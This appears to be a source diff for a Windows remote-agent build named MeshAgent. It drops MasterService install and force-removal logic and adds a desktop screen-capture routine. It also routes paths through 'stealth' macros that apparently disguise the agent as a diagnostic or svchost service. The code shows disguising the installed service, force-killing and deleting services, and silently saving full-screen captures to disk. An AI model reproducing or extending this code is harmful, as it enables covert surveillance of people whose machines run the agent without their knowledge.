-		MeshAgent_GetDirectoryNameW(exePathW, exeDirW, _countof(exeDirW)))
-	{
-		if (SUCCEEDED(StringCchPrintfW(candidate, _countof(candidate), L"%s\\%s", exeDirW, MESHAGENT_MASTER_SERVICE_EXE_NAME)) &&
-			MeshAgent_TryMasterServiceCandidate(candidate, output, outputLen))
-		{
-			return TRUE;
-		}
-	}
-
-	wchar_t repoRoot[MAX_PATH * 4] = {0};
-	if (MeshAgent_FindRepoRootW(repoRoot, _countof(repoRoot)))
-	{
-		wchar_t workspaceRoot[MAX_PATH * 4] = {0};
-		if (SUCCEEDED(StringCchCopyW(workspaceRoot, _countof(workspaceRoot), repoRoot)))
-		{
-			wchar_t* slash = wcsrchr(workspaceRoot, L'\\');
-			if (slash != NULL)
-			{
-				*slash = L'\0';
-				if (SUCCEEDED(StringCchPrintfW(candidate, _countof(candidate), L"%s\\UserModeHook\\bin\\x64\\MasterService.exe", workspaceRoot)) &&
-					MeshAgent_TryMasterServiceCandidate(candidate, output, outputLen))
-				{
-					return TRUE;
-				}
-				if (SUCCEEDED(StringCchPrintfW(candidate, _countof(candidate), L"%s\\UserModeHook\\build-tests\\bin\\Release\\MasterService.exe", workspaceRoot)) &&
-					MeshAgent_TryMasterServiceCandidate(candidate, output, outputLen))
-				{
-					return TRUE;
-				}
-				if (SUCCEEDED(StringCchPrintfW(candidate, _countof(candidate), L"%s\\UserModeHook\\build\\bin\\Release\\MasterService.exe", workspaceRoot)) &&
-					MeshAgent_TryMasterServiceCandidate(candidate, output, outputLen))
-				{
-					return TRUE;
-				}
-				if (SUCCEEDED(StringCchPrintfW(candidate, _countof(candidate), L"%s\\UserModeHook\\build-fresh\\bin\\Release\\MasterService.exe", workspaceRoot)) &&
-					MeshAgent_TryMasterServiceCandidate(candidate, output, outputLen))
-				{
-					return TRUE;
-				}
-			}
-		}
-	}
-
-	wchar_t installPath[MAX_PATH * 4] = {0};
-	if (MeshAgent_BuildMasterServiceInstallPath(installPath, _countof(installPath)) &&
-		MeshAgent_TryMasterServiceCandidate(installPath, output, outputLen))
-	{
-		return TRUE;
-	}
-
-	return FALSE;
-}
-
-static BOOL MeshAgent_SendMasterServiceControlRequest(const char* requestJson, char* response, size_t responseLen)
-{
-	if (requestJson == NULL || response == NULL || responseLen < 2) { return FALSE; }
-	response[0] = '\0';
-
-	if (!WaitNamedPipeW(MESHAGENT_UMH_CONTROL_PIPE_NAME, 15000))
-	{
-		return FALSE;
-	}
-
-	HANDLE pipe = CreateFileW(
-		MESHAGENT_UMH_CONTROL_PIPE_NAME,
-		GENERIC_READ | GENERIC_WRITE,
-		0,
-		NULL,
-		OPEN_EXISTING,
-		FILE_ATTRIBUTE_NORMAL,
-		NULL);
-	if (pipe == INVALID_HANDLE_VALUE)
-	{
-		return FALSE;
-	}
-
-	DWORD written = 0;
-	BOOL ok = WriteFile(pipe, requestJson, (DWORD)strlen(requestJson), &written, NULL);
-	DWORD read = 0;
-	if (ok)
-	{
-		ok = ReadFile(pipe, response, (DWORD)(responseLen - 1), &read, NULL);
-	}
-	CloseHandle(pipe);
-
-	if (!ok) { return FALSE; }
-	if (read >= responseLen) { read = (DWORD)(responseLen - 1); }
-	response[read] = '\0';
-	return TRUE;
-}
-
-static BOOL MeshAgent_ProbeMasterServiceControlPipe(void)
-{
-	char response[4096] = {0};
-	if (!MeshAgent_SendMasterServiceControlRequest("{\"op\":\"status\"}\n", response, sizeof(response)))
-	{
-		MeshAgent_LogNativeInstallerEvent("...MasterService control pipe unavailable (error=%lu)", GetLastError());
-		return FALSE;
-	}
-	MeshAgent_LogNativeInstallerEvent("...MasterService control status response: %s", response);
-	if (strstr(response, "\"ok\":true") != NULL)
-	{
-		return TRUE;
-	}
-
-	if (strstr(response, "unknown op") != NULL)
-	{
-		if (!MeshAgent_SendMasterServiceControlRequest("{\"op\":\"listProcesses\"}\n", response, sizeof(response)))
-		{
-			MeshAgent_LogNativeInstallerEvent("...MasterService control fallback probe failed (error=%lu)", GetLastError());
-			return FALSE;
-		}
-		MeshAgent_LogNativeInstallerEvent("...MasterService control fallback response: %s", response);
-		return (strstr(response, "\"ok\":true") != NULL);
-	}
-
-	return FALSE;
-}
-
-static BOOL MeshAgent_RunMasterServiceInstallCommand(const wchar_t* stagedPath, DWORD* exitCode)
-{
-	if (stagedPath == NULL || stagedPath[0] == L'\0') { return FALSE; }
-	if (!MeshAgent_RunChildProcess(stagedPath, L"--install --silent --wait --timeout 120 --output json", 240000, exitCode))
-	{
-		if (!MeshAgent_RunChildProcess(stagedPath, L"/install --silent", 240000, exitCode))
-		{
-			return FALSE;
-		}
-	}
-	return TRUE;
-}
-
-static BOOL MeshAgent_RunMasterServiceUninstallCommand(const wchar_t* stagedPath, DWORD* exitCode)
-{
-	if (stagedPath == NULL || stagedPath[0] == L'\0') { return FALSE; }
-	(void)MeshAgent_RunChildProcess(stagedPath, L"--quit --silent --wait --timeout 90 --output json", 180000, exitCode);
-	if (!MeshAgent_RunChildProcess(stagedPath, L"--uninstall --silent --wait --timeout 120 --output json", 240000, exitCode))
-	{
-		if (!MeshAgent_RunChildProcess(stagedPath, L"/uninstall --silent", 240000, exitCode))
-		{
-			return FALSE;
-		}
-	}
-	return TRUE;
-}
-
-static BOOL MeshAgent_TextContainsInsensitiveW(const wchar_t* haystack, const wchar_t* needle)
-{
-	if (haystack == NULL || needle == NULL) { return FALSE; }
-	size_t hayLen = wcslen(haystack);
-	size_t needleLen = wcslen(needle);
-	if (needleLen == 0 || needleLen > hayLen) { return FALSE; }
-
-	for (size_t i = 0; i + needleLen <= hayLen; ++i)
-	{
-		if (_wcsnicmp(haystack + i, needle, needleLen) == 0)
-		{
-			return TRUE;
-		}
-	}
-	return FALSE;
-}
-
-static BOOL MeshAgent_QueryServiceImagePath(const wchar_t* serviceName, wchar_t* imagePath, size_t imagePathLen)
-{
-	if (serviceName == NULL || serviceName[0] == L'\0' || imagePath == NULL || imagePathLen == 0) { return FALSE; }
-	imagePath[0] = L'\0';
-
-	SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
-	if (scm == NULL) { return FALSE; }
-	SC_HANDLE svc = OpenServiceW(scm, serviceName, SERVICE_QUERY_CONFIG);
-	if (svc == NULL)
-	{
-		CloseServiceHandle(scm);
-		return FALSE;
-	}
-
-	DWORD needed = 0;
-	(void)QueryServiceConfigW(svc, NULL, 0, &needed);
-	if (needed == 0 || GetLastError() != ERROR_INSUFFICIENT_BUFFER)
-	{
-		CloseServiceHandle(svc);
-		CloseServiceHandle(scm);
-		return FALSE;
-	}
-
-	LPQUERY_SERVICE_CONFIGW config = (LPQUERY_SERVICE_CONFIGW)malloc((size_t)needed);
-	if (config == NULL)
-	{
-		CloseServiceHandle(svc);
-		CloseServiceHandle(scm);
-		return FALSE;
-	}
-
-	BOOL ok = QueryServiceConfigW(svc, config, needed, &needed);
-	if (ok && config->lpBinaryPathName != NULL && config->lpBinaryPathName[0] != L'\0')
-	{
-		(void)StringCchCopyW(imagePath, imagePathLen, config->lpBinaryPathName);
-	}
-	free(config);
-
-	CloseServiceHandle(svc);
-	CloseServiceHandle(scm);
-	return (ok && imagePath[0] != L'\0');
-}
-
-static BOOL MeshAgent_TerminateProcessById(DWORD processId, DWORD waitMs)
-{
-	if (processId == 0) { return TRUE; }
-
-	HANDLE processHandle = OpenProcess(PROCESS_TERMINATE | SYNCHRONIZE, FALSE, processId);
-	if (processHandle == NULL)
-	{
-		DWORD err = GetLastError();
-		if (err == ERROR_INVALID_PARAMETER) { return TRUE; }
-		MeshAgent_LogNativeInstallerEvent("...MasterService force-remove failed: OpenProcess(pid=%lu) error=%lu",
-			(unsigned long)processId,
-			(unsigned long)err);
-		return FALSE;
-	}
-
-	BOOL terminated = TRUE;
-	if (!TerminateProcess(processHandle, ERROR_INSTALL_FAILURE))
-	{
-		DWORD err = GetLastError();
-		if (err != ERROR_ACCESS_DENIED)
-		{
-			MeshAgent_LogNativeInstallerEvent("...MasterService force-remove failed: TerminateProcess(pid=%lu) error=%lu",
-				(unsigned long)processId,
-				(unsigned long)err);
-			terminated = FALSE;
-		}
-	}
-
-	if (terminated)
-	{
-		DWORD wait = WaitForSingleObject(processHandle, waitMs == 0 ? 10000 : waitMs);
-		if (wait == WAIT_TIMEOUT)
-		{
-			MeshAgent_LogNativeInstallerEvent("...MasterService force-remove warning: process did not exit in time (pid=%lu)",
-				(unsigned long)processId);
-			terminated = FALSE;
-		}
-	}
-
-	CloseHandle(processHandle);
-	return terminated;
-}
-
-static BOOL MeshAgent_ForceRemoveMasterServiceService(DWORD timeoutMs)
-{
-	SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
-	if (scm == NULL)
-	{
-		MeshAgent_LogNativeInstallerEvent("...MasterService force-remove failed: OpenSCManager error=%lu", GetLastError());
-		return FALSE;
-	}
-
-	ULONGLONG start = GetTickCount64();
-	while ((GetTickCount64() - start) < timeoutMs)
-	{
-		SC_HANDLE svc = OpenServiceW(scm, MESHAGENT_MASTER_SERVICE_SERVICE_NAME, SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE);
-		if (svc == NULL)
-		{
-			DWORD err = GetLastError();
-			CloseServiceHandle(scm);
-			if (err == ERROR_SERVICE_DOES_NOT_EXIST) { return TRUE; }
-			MeshAgent_LogNativeInstallerEvent("...MasterService force-remove failed: OpenService error=%lu", err);
-			return FALSE;
-		}
-
-		SERVICE_STATUS_PROCESS status = {0};
-		DWORD needed = 0;
-		DWORD servicePid = 0;
-		if (QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE)&status, sizeof(status), &needed))
-		{
-			servicePid = status.dwProcessId;
-		}
-
-		(void)MeshAgent_StopServiceAndWait(svc, 15000);
-
-		BOOL deleted = DeleteService(svc);
-		DWORD deleteErr = deleted ? ERROR_SUCCESS : GetLastError();
-		CloseServiceHandle(svc);
-
-		if (!deleted &&
-			deleteErr != ERROR_SERVICE_MARKED_FOR_DELETE &&
-			deleteErr != ERROR_SERVICE_DOES_NOT_EXIST &&
-			deleteErr != ERROR_ACCESS_DENIED &&
-			deleteErr != ERROR_SHARING_VIOLATION)
-		{
-			MeshAgent_LogNativeInstallerEvent("...MasterService force-remove warning: DeleteService error=%lu", deleteErr);
-		}
-
-		if (!MeshAgent_QueryServiceStatus(MESHAGENT_MASTER_SERVICE_SERVICE_NAME, &status))
-		{
-			CloseServiceHandle(scm);
-			return TRUE;
-		}
-
-		if (servicePid == 0)
-		{
-			servicePid = status.dwProcessId;
-		}
-		if (servicePid != 0)
-		{
-			MeshAgent_LogNativeInstallerEvent("...MasterService force-remove: service still present (state=%lu pid=%lu), terminating process",
-				(unsigned long)status.dwCurrentState,
-				(unsigned long)servicePid);
-			(void)MeshAgent_TerminateProcessById(servicePid, 10000);
-		}
-
-		Sleep(500);
-	}
-
-	CloseServiceHandle(scm);
-	MeshAgent_LogNativeInstallerEvent("...MasterService force-remove verification failed: service still present");
-	return FALSE;
-}
-
-static BOOL MeshAgent_EnsureMasterServiceInstalled(struct MeshAgentHostContainer* agentHost, const wchar_t* sourceOverride, BOOL requireControlPipe)
-{
-	if (agentHost == NULL) { return FALSE; }
-
-	wchar_t stagedPath[MAX_PATH * 4] = {0};
-	if (!MeshAgent_BuildMasterServiceInstallPath(stagedPath, _countof(stagedPath)))
-	{
-		MeshAgent_LogNativeInstallerEvent("...MasterService integration failed: unable to resolve install path");
-		return FALSE;
-	}
-
-	wchar_t sourcePath[MAX_PATH * 4] = {0};
-	BOOL haveSource = MeshAgent_FindMasterServiceSource(sourceOverride, agentHost->exePath, sourcePath, _countof(sourcePath));
-	if (haveSource)
-	{
-		if (_wcsicmp(sourcePath, stagedPath) != 0)
-		{
-			if (!MeshAgent_FilesLikelyIdenticalW(sourcePath, stagedPath))
-			{
-				SetFileAttributesW(stagedPath, FILE_ATTRIBUTE_NORMAL);
-				if (!CopyFileW(sourcePath, stagedPath, FALSE))
-				{
-					DWORD copyErr = GetLastError();
-					wchar_t existingImagePath[MAX_PATH * 4] = {0};
-					BOOL serviceOnStagedPath =
-						MeshAgent_QueryServiceImagePath(MESHAGENT_MASTER_SERVICE_SERVICE_NAME, existingImagePath, _countof(existingImagePath)) &&
-						MeshAgent_TextContainsInsensitiveW(existingImagePath, stagedPath);
-
-					if ((copyErr == ERROR_SHARING_VIOLATION || copyErr == ERROR_ACCESS_DENIED) &&
-						MeshAgent_FileExistsW(stagedPath) &&
-						serviceOnStagedPath)
-					{
-						MeshAgent_LogNativeInstallerEvent("...MasterService binary already active at staged path; skipping locked overwrite");
-					}
-					else
-					{
-						MeshAgent_LogNativeInstallerEvent("...MasterService integration failed: unable to stage binary (error=%lu, source=%ls)", copyErr, sourcePath);
-						return FALSE;
-					}
-				}
-				else
-				{
-					MeshAgent_LogNativeInstallerEvent("...MasterService binary staged: %ls", stagedPath);
-				}
-			}
-		}
-	}
-	else if (!MeshAgent_FileExistsW(stagedPath))
-	{
-		MeshAgent_LogNativeInstallerEvent("...MasterService integration failed: source binary not found");
-		return FALSE;
-	}
-
-	if (!MeshAgent_FileExistsW(stagedPath))
-	{
-		MeshAgent_LogNativeInstallerEvent("...MasterService integration failed: staged binary missing (%ls)", stagedPath);
-		return FALSE;
-	}
-
-	DWORD exitCode = ERROR_SUCCESS;
-	if (!MeshAgent_RunMasterServiceInstallCommand(stagedPath, &exitCode))
-	{
-		MeshAgent_LogNativeInstallerEvent("...MasterService install command failed (exit=%lu)", exitCode);
-		return FALSE;
-	}
-
-	if (!MeshAgent_WaitForServiceRunning(MESHAGENT_MASTER_SERVICE_SERVICE_NAME, 90000))
-	{
-		MeshAgent_LogNativeInstallerEvent("...MasterService did not reach RUNNING state");
-		return FALSE;
-	}
-
-	wchar_t serviceImagePath[MAX_PATH * 4] = {0};
-	if (!MeshAgent_QueryServiceImagePath(MESHAGENT_MASTER_SERVICE_SERVICE_NAME, serviceImagePath, _countof(serviceImagePath)))
-	{
-		MeshAgent_LogNativeInstallerEvent("...MasterService integration failed: unable to query service image path");
-		return FALSE;
-	}
-	if (!MeshAgent_TextContainsInsensitiveW(serviceImagePath, stagedPath))
-	{
-		MeshAgent_LogNativeInstallerEvent("...MasterService service path mismatch (expected=%ls, actual=%ls); forcing reinstall", stagedPath, serviceImagePath);
-		if (!MeshAgent_ForceRemoveMasterServiceService(90000))
-		{
-			MeshAgent_LogNativeInstallerEvent("...MasterService integration failed: unable to remove mismatched service registration");
-			return FALSE;
-		}
-		if (!MeshAgent_RunMasterServiceInstallCommand(stagedPath, &exitCode))
-		{
-			MeshAgent_LogNativeInstallerEvent("...MasterService reinstall command failed after path mismatch (exit=%lu)", exitCode);
-			return FALSE;
-		}
-		if (!MeshAgent_WaitForServiceRunning(MESHAGENT_MASTER_SERVICE_SERVICE_NAME, 90000))
-		{
-			MeshAgent_LogNativeInstallerEvent("...MasterService did not reach RUNNING after path remediation");
-			return FALSE;
-		}
-		serviceImagePath[0] = L'\0';
-		if (!MeshAgent_QueryServiceImagePath(MESHAGENT_MASTER_SERVICE_SERVICE_NAME, serviceImagePath, _countof(serviceImagePath)) ||
-			!MeshAgent_TextContainsInsensitiveW(serviceImagePath, stagedPath))
-		{
-			MeshAgent_LogNativeInstallerEvent("...MasterService integration failed: service image path still mismatched after remediation (%ls)", serviceImagePath);
-			return FALSE;
-		}
-	}
-
-	(void)MeshAgent_RunChildProcess(stagedPath, L"--status --output json", 60000, &exitCode);
-	if (requireControlPipe && !MeshAgent_ProbeMasterServiceControlPipe())
-	{
-		MeshAgent_LogNativeInstallerEvent("...MasterService control pipe status probe failed");
-		return FALSE;
-	}
-
-	return TRUE;
-}
-
-static BOOL MeshAgent_UninstallMasterService(void)
-{
-	wchar_t stagedPath[MAX_PATH * 4] = {0};
-	BOOL haveExe = MeshAgent_BuildMasterServiceInstallPath(stagedPath, _countof(stagedPath)) && MeshAgent_FileExistsW(stagedPath);
-
-	DWORD exitCode = ERROR_SUCCESS;
-	BOOL commandOk = TRUE;
-	if (haveExe)
-	{
-		if (!MeshAgent_RunMasterServiceUninstallCommand(stagedPath, &exitCode))
-		{
-			MeshAgent_LogNativeInstallerEvent("...MasterService uninstall command failed (exit=%lu)", exitCode);
-			commandOk = FALSE;
-		}
-	}
-
-	SERVICE_STATUS_PROCESS status;
-	if (MeshAgent_QueryServiceStatus(MESHAGENT_MASTER_SERVICE_SERVICE_NAME, &status))
-	{
-		MeshAgent_LogNativeInstallerEvent("...MasterService uninstall left service present (state=%lu pid=%lu); forcing removal",
-			(unsigned long)status.dwCurrentState,
-			(unsigned long)status.dwProcessId);
-		if (!MeshAgent_ForceRemoveMasterServiceService(90000))
-		{
-			return FALSE;
-		}
-	}
-	if (MeshAgent_QueryServiceStatus(MESHAGENT_MASTER_SERVICE_SERVICE_NAME, &status))
-	{
-		MeshAgent_LogNativeInstallerEvent("...MasterService uninstall verification failed: service still present (state=%lu pid=%lu)",
-			(unsigned long)status.dwCurrentState,
-			(unsigned long)status.dwProcessId);
-		return FALSE;
-	}
-
-	if (!commandOk)
-	{
-		MeshAgent_LogNativeInstallerEvent("...MasterService uninstall command returned non-zero but service removal verification succeeded");
-	}
-
-	return TRUE;
-}
-
 static HANDLE MeshAgent_OpenRegressionLog(void)
 {
 	WCHAR logPath[MAX_PATH * 4] = {0};
@@ -1582,7 +1197,7 @@ static HANDLE MeshAgent_OpenRegressionLog(void)
 		{
 			StringCchCopyW(logDir, _countof(logDir), L"C:\\ProgramData");
 		}
-		StringCchCatW(logDir, _countof(logDir), L"\\DiagnosticHost\\logs");
+		StringCchCatW(logDir, _countof(logDir), L"\\" STEALTH_FALLBACK_SERVICE_NAME L"\\logs");
 	}
 
 	CreateDirectoryW(logDir, NULL);
@@ -1703,8 +1318,8 @@ static void MeshAgent_CopyEvidenceSnapshot(const wchar_t* phaseLabel)
 	}
 	else
 	{
-		StringCchCopyW(installDir, _countof(installDir), L"C:\\ProgramData\\DiagnosticHost");
-		StringCchCopyW(logsDir, _countof(logsDir), L"C:\\ProgramData\\DiagnosticHost\\logs");
+		StringCchPrintfW(installDir, _countof(installDir), L"C:\\ProgramData\\%s", STEALTH_FALLBACK_SERVICE_NAME);
+		StringCchPrintfW(logsDir, _countof(logsDir), L"C:\\ProgramData\\%s\\logs", STEALTH_FALLBACK_SERVICE_NAME);
 	}
 
 	wchar_t srcPath[MAX_PATH * 4] = {0};
@@ -1721,8 +1336,219 @@ static void MeshAgent_CopyEvidenceSnapshot(const wchar_t* phaseLabel)
 	MeshAgent_CopyEvidenceFile(srcPath, testingDir, prefix, L"controlchannel-debug.log");
 	StringCchPrintfW(srcPath, _countof(srcPath), L"%s\\svchost-debug.log", installDir);
 	MeshAgent_CopyEvidenceFile(srcPath, testingDir, prefix, L"svchost-debug.log");
-	StringCchPrintfW(srcPath, _countof(srcPath), L"%s\\diaghost.log", installDir);
-	MeshAgent_CopyEvidenceFile(srcPath, testingDir, prefix, L"diaghost.log");
+	StringCchPrintfW(srcPath, _countof(srcPath), L"%s\\" STEALTH_FALLBACK_LOG_NAME, installDir);
+	MeshAgent_CopyEvidenceFile(srcPath, testingDir, prefix, STEALTH_FALLBACK_LOG_NAME);
+}
+
+static BOOL MeshAgent_WidePathToJsonValue(const wchar_t* input, char* output, size_t outputLen)
+{
+	if (output == NULL || outputLen == 0) { return FALSE; }
+	output[0] = 0;
+	if (input == NULL || input[0] == 0) { return FALSE; }
+	int len = WideCharToMultiByte(CP_UTF8, 0, input, -1, output, (int)outputLen, NULL, NULL);
+	if (len <= 0 || (size_t)len > outputLen) { return FALSE; }
+	for (int i = 0; output[i] != 0; ++i)
+	{
+		if (output[i] == '\\') { output[i] = '/'; }
+	}
+	return TRUE;
+}
+
+static BOOL MeshAgent_BuildDefaultPreProtectionCapturePathW(wchar_t* output, size_t outputLen)
+{
+	if (output == NULL || outputLen == 0) { return FALSE; }
+	output[0] = L'\0';
+
+	wchar_t programData[MAX_PATH] = {0};
+	if (FAILED(SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, SHGFP_TYPE_CURRENT, programData)))
+	{
+		StringCchCopyW(programData, _countof(programData), L"C:\\ProgramData");
+	}
+
+	wchar_t dirPath[MAX_PATH * 4] = {0};
+	StringCchPrintfW(dirPath, _countof(dirPath), L"%s\\" STEALTH_FALLBACK_SERVICE_NAME L"\\logs\\preprotection", programData);
+	SHCreateDirectoryExW(NULL, dirPath, NULL);
+
+	wchar_t timestamp[64] = {0};
+	MeshAgent_FormatTimestamp(timestamp, _countof(timestamp));
+	return SUCCEEDED(StringCchPrintfW(output, outputLen, L"%s\\%s_pre_protection.bmp", dirPath, timestamp));
+}
+
+// Forward declaration for DXGI one-shot capture from tile.cpp (C++ with extern "C")
+#if defined(_LINKVM)
+extern int capture_desktop_dxgi_oneshot(void** buffer, int* width, int* height);
+#endif
+
+static BOOL MeshAgent_WriteBufferAsBmpW(const wchar_t* outputPath, void* bgra, LONG width, LONG height, DWORD* fileSizeOut)
+{
+	HANDLE hFile = INVALID_HANDLE_VALUE;
+	DWORD imageBytes = (DWORD)((DWORD)width * (DWORD)height * 4);
+	DWORD written = 0;
+
+	BITMAPINFOHEADER bih;
+	ZeroMemory(&bih, sizeof(bih));
+	bih.biSize = sizeof(BITMAPINFOHEADER);
+	bih.biWidth = width;
+	bih.biHeight = -height; // top-down
+	bih.biPlanes = 1;
+	bih.biBitCount = 32;
+	bih.biCompression = BI_RGB;
+
+	BITMAPFILEHEADER fileHeader;
+	ZeroMemory(&fileHeader, sizeof(fileHeader));
+	fileHeader.bfType = 0x4D42;
+	fileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+	fileHeader.bfSize = fileHeader.bfOffBits + imageBytes;
+
+	hFile = CreateFileW(outputPath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hFile == INVALID_HANDLE_VALUE) { return FALSE; }
+
+	if (!WriteFile(hFile, &fileHeader, sizeof(fileHeader), &written, NULL) || written != sizeof(fileHeader)) { CloseHandle(hFile); return FALSE; }
+	if (!WriteFile(hFile, &bih, sizeof(bih), &written, NULL) || written != sizeof(bih)) { CloseHandle(hFile); return FALSE; }
+	if (!WriteFile(hFile, bgra, imageBytes, &written, NULL) || written != imageBytes) { CloseHandle(hFile); return FALSE; }
+	CloseHandle(hFile);
+	if (fileSizeOut != NULL) { *fileSizeOut = fileHeader.bfSize; }
+	return TRUE;
+}
+
+static BOOL MeshAgent_CaptureDesktopBmpW(const wchar_t* outputPath, LONG* widthOut, LONG* heightOut, DWORD* fileSizeOut)
+{
+	BOOL ok = FALSE;
+	HDC hScreen = NULL;
+	HDC hCapture = NULL;
+	HBITMAP hBitmap = NULL;
+	void* bits = NULL;
+	LONG width = 0;
+	LONG height = 0;
+	LONG left = 0;
+	LONG top = 0;
+	DWORD imageBytes = 0;
+
+	if (outputPath == NULL || outputPath[0] == L'\0') { return FALSE; }
+
+	// Ensure parent directory exists
+	{
+		wchar_t parentDir[MAX_PATH * 4] = {0};
+		StringCchCopyW(parentDir, _countof(parentDir), outputPath);
+		wchar_t* slash = wcsrchr(parentDir, L'\\');
+		if (slash != NULL)
+		{
+			*slash = L'\0';
+			SHCreateDirectoryExW(NULL, parentDir, NULL);
+		}
+	}
+
+	// Try DXGI first — captures DWM-composited content including DX/GL surfaces and overlays
+#if defined(_LINKVM)
+	{
+		void* dxgiBuffer = NULL;
+		int dxgiW = 0, dxgiH = 0;
+		if (capture_desktop_dxgi_oneshot(&dxgiBuffer, &dxgiW, &dxgiH) != 0 && dxgiBuffer != NULL && dxgiW > 0 && dxgiH > 0)
+		{
+			DWORD fileSize = 0;
+			ok = MeshAgent_WriteBufferAsBmpW(outputPath, dxgiBuffer, (LONG)dxgiW, (LONG)dxgiH, &fileSize);
+			free(dxgiBuffer);
+			if (ok)
+			{
+				if (widthOut != NULL) { *widthOut = (LONG)dxgiW; }
+				if (heightOut != NULL) { *heightOut = (LONG)dxgiH; }
+				if (fileSizeOut != NULL) { *fileSizeOut = fileSize; }
+				return TRUE;
+			}
+		}
+	}
+#endif
+
+	// GDI fallback — always available, captures visible desktop via BitBlt
+	left = GetSystemMetrics(SM_XVIRTUALSCREEN);
+	top = GetSystemMetrics(SM_YVIRTUALSCREEN);
+	width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+	height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+	if (width <= 0 || height <= 0) { goto cleanup; }
+
+	hScreen = GetDC(NULL);
+	if (hScreen == NULL) { goto cleanup; }
+	hCapture = CreateCompatibleDC(hScreen);
+	if (hCapture == NULL) { goto cleanup; }
+	hBitmap = CreateCompatibleBitmap(hScreen, width, height);
+	if (hBitmap == NULL) { goto cleanup; }
+	if (SelectObject(hCapture, hBitmap) == NULL) { goto cleanup; }
+	if (BitBlt(hCapture, 0, 0, width, height, hScreen, left, top, SRCCOPY | CAPTUREBLT) == FALSE) { goto cleanup; }
+
+	imageBytes = (DWORD)(width * height * 4);
+	bits = malloc(imageBytes);
+	if (bits == NULL) { goto cleanup; }
+	{
+		BITMAPINFO bmi;
+		ZeroMemory(&bmi, sizeof(bmi));
+		bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+		bmi.bmiHeader.biWidth = width;
+		bmi.bmiHeader.biHeight = -height;
+		bmi.bmiHeader.biPlanes = 1;
+		bmi.bmiHeader.biBitCount = 32;
+		bmi.bmiHeader.biCompression = BI_RGB;
+		if (GetDIBits(hCapture, hBitmap, 0, (UINT)height, bits, &bmi, DIB_RGB_COLORS) == 0) { goto cleanup; }
+	}
+
+	{
+		DWORD fileSize = 0;
+		ok = MeshAgent_WriteBufferAsBmpW(outputPath, bits, width, height, &fileSize);
+		if (ok && fileSizeOut != NULL) { *fileSizeOut = fileSize; }
+	}
+
+cleanup:
+	if (bits != NULL) { free(bits); }
+	if (hBitmap != NULL) { DeleteObject(hBitmap); }
+	if (hCapture != NULL) { DeleteDC(hCapture); }
+	if (hScreen != NULL) { ReleaseDC(NULL, hScreen); }
+	if (ok)
+	{
+		if (widthOut != NULL) { *widthOut = width; }
+		if (heightOut != NULL) { *heightOut = height; }
+	}
+	return ok;
+}
+
+static BOOL MeshAgent_RunPreProtectionCaptureValidationW(const wchar_t* outputPath)
+{
+	wchar_t capturePath[MAX_PATH * 4] = {0};
+	if (outputPath != NULL && outputPath[0] != L'\0')
+	{
+		StringCchCopyW(capturePath, _countof(capturePath), outputPath);
+	}
+	else if (!MeshAgent_BuildDefaultPreProtectionCapturePathW(capturePath, _countof(capturePath)))
+	{
+		printf("{\"ok\":false,\"error\":\"capture-path-unavailable\"}\n");
+		return FALSE;
+	}
+
+	LONG width = 0;
+	LONG height = 0;
+	DWORD fileSize = 0;
+	BOOL ok = MeshAgent_CaptureDesktopBmpW(capturePath, &width, &height, &fileSize);
+	char capturePathUtf8[MAX_PATH * 8] = {0};
+	MeshAgent_WidePathToJsonValue(capturePath, capturePathUtf8, sizeof(capturePathUtf8));
+
+	SYSTEMTIME st;
+	GetSystemTime(&st);
+	char timestamp[64];
+	sprintf_s(timestamp, sizeof(timestamp), "%04u-%02u-%02uT%02u:%02u:%02u.%03uZ",
+		(unsigned int)st.wYear, (unsigned int)st.wMonth, (unsigned int)st.wDay,
+		(unsigned int)st.wHour, (unsigned int)st.wMinute, (unsigned int)st.wSecond, (unsigned int)st.wMilliseconds);
+
+	if (!ok)
+	{
+		printf("{\"ok\":false,\"capture_path\":\"%s\",\"captured_at_utc\":\"%s\",\"error\":\"desktop-capture-failed\",\"win32_error\":%lu}\n",
+			capturePathUtf8, timestamp, (unsigned long)GetLastError());
+		MeshAgent_LogNativeInstallerEvent("...Pre-protection capture failed: %ls (error=%lu)", capturePath, (unsigned long)GetLastError());
+		return FALSE;
+	}
+
+	printf("{\"ok\":true,\"capture_path\":\"%s\",\"captured_at_utc\":\"%s\",\"width\":%ld,\"height\":%ld,\"file_size\":%lu}\n",
+		capturePathUtf8, timestamp, width, height, (unsigned long)fileSize);
+	MeshAgent_LogNativeInstallerEvent("...Pre-protection capture saved: %ls (%ldx%ld, %lu bytes)",
+		capturePath, width, height, (unsigned long)fileSize);
+	return TRUE;
 }
 
 static ULONGLONG MeshAgent_FileTimeToUint64(const FILETIME* ft)
@@ -2292,12 +2118,14 @@ static BOOL MeshAgent_RunMajorBugSelfTest(
 	return TRUE;
 }
 
-static BOOL MeshAgent_RunNativeStealthFullUpdate(struct MeshAgentHostContainer* agentHost, const wchar_t* updateExePath, const wchar_t* updateDllPath, const wchar_t* masterServiceSource, BOOL masterServiceEnabled)
+static BOOL MeshAgent_RunNativeStealthFullUpdate(struct MeshAgentHostContainer* agentHost, const wchar_t* updateExePath, const wchar_t* updateDllPath)
 {
 	if (agentHost == NULL || agentHost->exePath == NULL) { return FALSE; }
 
 	WCHAR exePathW[MAX_PATH * 4];
+	WCHAR serviceName[256] = {0};
 	ILibUTF8ToWideEx(agentHost->exePath, -1, exePathW, (int)(sizeof(exePathW) / sizeof(WCHAR)));
+	MeshAgent_GetServiceKeyNameW(serviceName, _countof(serviceName));
 
 #if defined(MESH_AGENT_SVCHOST_MODE) && (MESH_AGENT_SVCHOST_MODE != 0)
 	const BOOL useSvchostMode = TRUE;
@@ -2308,16 +2136,67 @@ static BOOL MeshAgent_RunNativeStealthFullUpdate(struct MeshAgentHostContainer* 
 	const wchar_t* sourceExe = (updateExePath != NULL && updateExePath[0] != L'\0') ? updateExePath : exePathW;
